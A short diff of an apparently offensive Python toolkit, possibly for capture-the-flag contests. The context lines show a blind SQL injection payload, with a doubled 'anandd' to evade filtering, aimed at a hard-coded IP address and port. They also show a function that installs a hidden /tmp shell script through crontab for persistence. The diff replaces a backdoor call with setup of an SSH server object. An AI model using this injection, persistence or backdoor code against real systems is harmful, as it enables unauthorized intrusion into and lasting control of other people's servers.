@@ -5,6 +5,7 @@ import requests
 import config
 import tools
 import time
+import ssh
 def blindSql():
     length=32
     webAttact.MapAttacker('http://123.206.87.240:9004/1ndex.php?id=5\' anandd left(database(),{0})=\'{1}\' --+',length,'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890').StartAttack()
@@ -33,5 +34,6 @@ def buildAndRunCrontabCmd(index):
     
     return w.runCmd(index,f'/usr/bin/crontab /tmp/.{md5Str}.sh')
 if __name__ == "__main__":
-    bckDoor()
+    ssh=ssh.SSHserver(ssh.ServerConfig(ssh.DbConfig('dnname','u','p'),'',''))
+
     pass
